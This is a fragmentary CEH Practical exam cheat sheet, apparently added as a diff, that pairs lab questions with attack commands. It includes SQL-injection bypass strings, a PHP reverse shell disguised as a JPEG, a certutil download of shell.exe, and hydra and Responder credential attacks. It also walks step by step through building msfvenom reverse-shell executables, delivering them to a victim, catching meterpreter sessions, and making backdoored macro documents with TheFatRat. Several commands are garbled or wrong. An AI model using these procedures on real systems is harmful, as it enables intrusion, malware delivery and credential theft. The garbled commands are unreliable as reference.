@@ -1,0 +1,325 @@
+References
+ https://github.com/hunterxxx/CEH-v12-Practical
+ https://github.com/Samsar4/Ethical-Hacking-Labs?tab=readme-ov-file
+ https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
+ https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools
+ https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md
+ admin'   
+admin' #  
+admin'  
+' or 1=1  
+' or 1=1#  
+' or 1=1
+ ') or '1'='1  
+') or ('1'='1—
+ FILE UPLOAD - WINDOWS
+ https
+ github.com/System-CTL/CEH_CHEAT_SHEET#file-upload
+ type GIF98 before PHP code and save as shell.jpeg.
+ Copy the uploaded path
+ windows
+ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333-f raw
+ Click on command injectio and type below command |copy
+ C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg
+ C:\xampp\htdocs\DVWA\hackable\uploads\aa.php
+ Msfconsole Use multi/handler Set payload php/meterpreter/reverse_tcp Set lhost
+ Set lport Run
+ Beroot : windows privesc
+ DIE (Windows): Entropy value, Entry Point, Extract STrings
+ Responder LLMNR
+OpenStego | -> image stegnography
+ QuickStego
+ OleView
+ Dcomcnf
+ RpcDump
+ Gacutil
+ sandfly-entropyscan | for finding high entropy values { Malware Analysis }
+ Strings
+ FTK Imager
+ Malwoverview
+ GDB or IDA
+ Crunch
+ Cewl
+ LinPeas
+ Aircrack-ng
+ GTFOBINS
+ Veracrypt
+ Hashcalc
+ Rainbow Crack
+ Radare2
+ MQTT: IoT Question: -> import it into the wireshark and apply the mqtt filter
+ 1- NetBios enum using windows- in cmd type- $nbtstat -a 10.10.10.10 (-a
+ displays NEtBIOS name table)
+ 2- NetBios enum using nmap- $nmap -sV -v script nbstat.nse 10.10.10.16
+ 3- SNMP enum using nmap-  $nmap -sU -p 161 10.10.10.10 (-p 161 is port for
+ SNMP)
+ 4- DNS recon/enum-  $dnsrecon -d 
+.google.com -z
+ 5- FTP enum using nmap-  $nmap -p 21 -A 10.10.10.10 
+6- NetBios enum using enum4linux- $enum4linux -u martin -p apple -n 
+10.10.10.10 (all info)
+ Important:
+ First take a good look of all question and try to remember all ports which are presented in the
+ question, and than start an nmap scan with these ports.
+ 1. FQDN of the Domain Controller
+nmap -p 389,636 -sC *ldap* -sV -T4 -v -oG result.txt IP/CIDR 
+nmap 
+script smb-os-discovery IP/24 oG 
+# Also I can use nslookup to resolve the FQDN like DNS by giving just
+ nslookup IP
+ 2. Find WampServer
+ nmap -p 80,443 IP/CIDR
+ 3. find and crack smb service.
+ nmap -p 139,445 -oG smb-ip.txt IP/CIDR
+ hydra -L ~/users/list -P ~/pass/list IP smb
+ 4. An insider attack has been identified in one of the employees mobile device in
+ 192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain
+ malicious elf files stored in a folder "Scan". Perform deep scan on the elf files and obtain
+ the last 4 digits of SHA 384 hash of the file with highest entropy value.
+ Identify the mobile device: Use tools like `nbtscan` or `nmblookup` to
+ identify the mobile devices in the network.
+ $ nbtscan -r 192.168.0.0/24
+ $ nmap -p 5555 -sV -sS 192.168.0.0/24
+ Perform deep scan on the ELF files: T
+ o analyze the ELF files, use tools like `file`, `strings`, and `readelf`.
+ These tools can provide information about the file type, sections, and
+ symbols, as well as the contents of the files.
+ $file <filename>
+ $strings <filename>
+ $readelf -a <filename>
+ # for multiple files
+ $ for f in *; do file $f | grep -q "ELF executable" 
+echo $f; done
+ Calculate entropy values: To find the file with the highest entropy value, you
+ can use the `ent` command or a similar tool to calculate the entropy of each
+ ELF file.
+ $ent file_name
+Calculate 384 Hash of the ELF:
+ $shasum -a 384 file_name
+ Finally obtain the last 4 digit from the hash:
+ $shasum -a 384 <filename> | awk '{print $1}' | cut -d' ' -f2 | rev | cut -c 1
+4 | rev
+ 5. Perform a vulnerability scan for the host with IP address 172.20.0.16 What is the severity
+ score of a vulnerability the indicates the 
+End of Life of a web development language
+ platform?
+ $sudo systemctl start nessus
+ Open a web browser and navigate to `https localhost:8834`login in nessus and
+ start a new scan.
+ 6. Exploit a remote login and command-line execution application on a Linux target in the
+ 192.168.0.0/24 subnet to access a sensitive file, NetworkPass.txt Enter the content in the
+ file as answer.
+ #check for ssh and telnet vulnerbilities
+ 7. Use "Imagination" if you are stuck. | STEGNO
+ openstego 
+steghide extract -sf file_name
+ 8. ftp Bruteforce
+ hydra -P pass/list -L User/list IP ftp
+ 9. You used shoulder surfing to identify the usernames and password of a user on the
+ Ubuntu machine in the 192.168.0.0/24 network, that is, smith and Linux123. Access the
+ Machine, Perform vertical privilege escalation to that of a root user, and enter the content
+ of the imroot.txt file as the answer. | PrivEsc
+10. During as assignment, an incident responder has retained a suspicious executable file
+ "die-another-da" Your task as a malware analyst is to find the executable's Entry point
+ (Address). The file is in the C:\Users\Admin\Documents directory in the "EH Workstation 
+2" machines.
+ # in windows environment we can use DIE tool to identify Entry point adress or
+ we can also see the entropy value, also we can extract strings from the file
+ #To find the entry point of the "die-another-da" executable file, you can use
+ the `readelf` command if you have access to a Linux system, or you can use a
+ tool like PEview if you are using a Windows system.
+ $ readelf -h die-another-da
+ Entry point address:               
+Start of program headers:          
+Start of section headers:          
+Flags:                             
+Size of this header:               
+0x80483d0
+ 52 (bytes into file)
+ 564 (bytes into file)
+ 0x0
+ 64 (bytes)
+ In windows:
+ 1. Open PEview and open the "die-another-da" file.
+ 2. In the "File Information" section, look for the "Entry Point" field. This
+ will give you the address of the entry point for the executable.
+ 11. You are investigating a massive DDoS attack launched against a target at 10.10.1.10.
+ Identify the attacking IP address that sent most packets to the victim machine. The
+ network capture file "attack-traffic.pcapng" is saved in the Documents folder of the "EH
+ Workstation - 1" (ParrotSecurity) machine. | Wireshark
+ Wireshark static  
+end point
+ 12. Perform the SQL injection attack on your target web application cinema.cehorg.com and
+ extract the password of a user Sarah. You have already registered on the website with
+ credentials Karen/computer.
+ 13. Exploit the web application available at 
+www.cehorg.com and enter the flag's value at the
+ page with page_id=84.
+14. Perform vulnerability research and exploit the web application training.cehorg.com,
+ available at 192.168.0.64. Locate the Flag.txt file and enter its content as the answer.
+ 15. Perform SQL injection attack on a web application cybersec.cehorg.com, available at
+ 172.20.0.22. Find the value in the Flag column in one of the DB tables and enter it as the
+ answer.
+ 16. A file named Hast.txt has been uploaded through DVWA (
+ http://172.20.0.16:8080/DVWA).
+ The file is located in the "C:\wamp64\www\DVWA\hackable\uploads" directory. Access the
+ file and crack the MD5 hash to reveal the original message. Enter the decrypted message
+ as the answer. You can log into the DVWA using the credentials admin/passwd.
+ 17. Analyse the traffic capture from an IoT network located in the Documents folder of the "EH
+ Workstation - 1" (ParrotSecurity) machine, identify the packet with IoT Publish Message,
+ and enter the message length as the answer.
+ wireshark  
+search for mqtt packets these packetes releted to Iot Devices
+ 18. Your organization suspects the presence of a rogue AP in the vicinity. You are tasked with
+ cracking the wireless encryption, connecting to the network and setting up a honeypot.
+ The airdump-ng tool has been used, and the Wi-Fi traffic capture named
+ "WirelessCapture.cap" is located in the Documents folder in the “EH Workstation - 1"
+ (ParrotSecurity) machine. Crack the wireless encryption and identify the Wi-Fi password. |
+ "Crack WiFi password using pcap file"
+ aircrack-ng WirelessCapture.cap
+ aircrack-ng WirelessCapture.cap -w hash_password
+ 19. A disgruntled ex-employee has hidden a server access code in a Windows machine in the
+ 192.168.0.0/24 subnet. You can not physically access the target machine. but you know
+ that the organization administration purpose. Your task is to retrieve the "sa_code.txt" file
+ from the target machine and enter the string in the file as the answer.
+20.  A disgruntled employee of your target organization has stolen the company's trade secrets
+ and encrypted them using VeraCrypt. The VeraCrypt volume file "Secret" is stored on the
+ C: drive of the "EH Workstation - 2" machine. The password to access the volume has
+ been hashed and saved in the file Key2Secret.txt located in the Documents folder in the
+ "EH Workstation - 1" (ParrotSecurity) machine. As an ethical hacker working with the
+ company. you need to decrypt the hash in the with the company. you need to decrypt the
+ hash in the Key2Secret.txt file, access the VeraCrypt volume, and find the secret code in
+ the file named Confindential.txt.
+ # first crack the hash of the "Key2Secret.txt" file which gives me the
+ Password to decrypt the veracrypt encrypted file. then open veracrypt select
+ Volume file "Secret" click on the mount button and enter the password. 
+Using VeraCrypt GUI:
+ 1. Select Encrypted Volume:
+ In the VeraCrypt main window, click on the "Select File" button to choose the
+ encrypted volume file.
+ 2. Mount Volume:
+ After selecting the volume file, click on the "Mount" button.
+ 3. Enter Password:
+ Enter the password associated with the encrypted volume when prompted. If you are
+ using a keyfile, select it as well.
+ 4. Select Mount Point:
+ Choose a drive letter or an empty folder as the mount point for the decrypted volume.
+ Click "OK" to proceed.
+ 5. Access the Decrypted Volume:
+ Once the volume is successfully mounted, you can access it through the assigned
+ drive letter or the chosen mount point. The contents of the volume will be accessible
+ as if it were a regular drive
+ Identify OS by checking Wireshark using TTL value
+ we can see TTL value also in the ping command
+ ping IP
+SQL:
+ Got Console and type document.cookie
+sqlmap -u "url" cookie="values" -dbs
+ DSSS Scanner
+ $python3 dsss.py -u "url" cookie=""
+certutil -urlcache -f http 10.10.14.29:8083/shell.exe shell.exe
+ invoke-webrequest-uri "http url.com:80"-outfile "file"
+ netstat -ano
+ Rainbowcrack
+ Use Winrtgen to generate a rainbow table
+ Launch RainbowCrack
+ File->Load NTLM Hashes from PWDUMP File
+ Rainbow Table->Search Rainbow Table
+ Use the generated rainbow table
+ RainbowCrack automatically starts to crack the hashes QuickStego
+ Launch QuickStego
+ Open Image, and select target .jpg file
+ Open Text, and select a txt file
+ Hide text, save image file
+ Re-launch, Open Image
+ Select stego file
+ Hidden text shows up
+ // 1 - on a windows machine
+ wmic useraccount get name,sid //list users
+ // using a tool
+ Pwdump7.exe >> /path/file.txt //get a file to crack
+ // using ophcrack to crack the hash with rainbow tables
+ ophcrack >> tables >> vista free
+ // cracking with rainbow tables using winrtgen to create a rainbow table
+ winrtgen >> add table >> hashntlm
+ rainbowcrack >> select the obtained file >> select dircreatd with winrtgen
+ // 2 - using responder to capture the traffic of the windows system
+ //run a shared folder on windows
+ //capture the ntlm hash >> cracking with jhon
+ chmod +x 
+responder.py
+ ./
+ Responder.py -I eth0-I = interface //ifconfig
+ // cracking the ntlm capture with ntlm
+ john capture.txt
+ lopthcr4ck // helps to crack ntlm passwords store on windows
+// system hacking windows
+ // look for an exploit and try to get remote access to the victim using msfvnom,metasploit and
+ rat
+ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=my.ip
+ LPORT=my.port -o /root/Desktop/test.exe-p = payload--platform = Os-a = architecture-f = format of the payload-o = output dir
+ // now with try to share the file with the victim
+ // we try three forms
+ // #1 - option
+ mkdir /var/www/html/share
+ chmod -R 755 /var/www/html/share
+ chown -R www-data:www-data /var/www/html/share
+ // copy the text.exe to the new server
+ cp /root/Desktop/test.exe /var/www/html/share
+ // #2 - option
+ python -m SimpleHttpServer 80
+ // #3 - option
+ python3 http.server 80
+ // start the serverwith apache
+ service apache2 start //apache version
+ //now we open msfconsole to gain a inverse shell with meterpreter
+ use exploit/multi/handler //similar to nc -nlvp .port
+ set payload windows/meterpreter/reverse_tcp
+ set LHOST my.ip
+ set LPORT my.port
+ exploit/run // run the exploit
+ //share the file with the victim
+ my.ip/share
+ //inside the victim's machine
+ run the exe // text.exe share with the server
+ //look at the metasploit session
+ sysinfo // system info
+ //now with try to enumerate to know misconfigurations on the w10 system
+ //using PowerSploit
+upload /path/PowerUp.ps1 powerup.ps1 // with meterpreter
+ shell // with shell with change from meterpreter to windows shell
+ // now we execute powerup
+ powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
+ // now we know that windows is vulnerable to dll injection
+ // change to meterpreter shell with exit & run
+ run vnc // will open a VNC remote control on the victim
+ // Now we will try another method to gain access to a machine
+ // with TheFatRat
+ chmod +x fatrat
+ chmod +x 
+setup.sh
+ chmd +x 
+./
+ powerfull.sh
+ setup.sh
+ //run fatrat
+ option 6 // create fud.. [Excelent]
+ option 3 // create apache + ps1
+ //put the lhost and lport
+ enter the name for files : payload
+ option 3 // for choosing meterpreter/reverse_tcp
+ // payload generated
+ option 9 // back to the menu
+ option 7 // create a back office
+ option 2 // macro windows and select lhost and lport
+ // enter the name for the doc file
+ // use custom exe backdoor Y
+ option 3 // reverse_tcp
+ // backdoor inside the doc generate
+ // share document with the server option 1 and 2 above
+ // start msfconsole to gain meterpreter shell
+ use exploit/multi/handler
+ set payload windows/meterpreter/reverse_tcp
+ set LHOST my.ip
+ set RHOST my.port
+ exploit / run
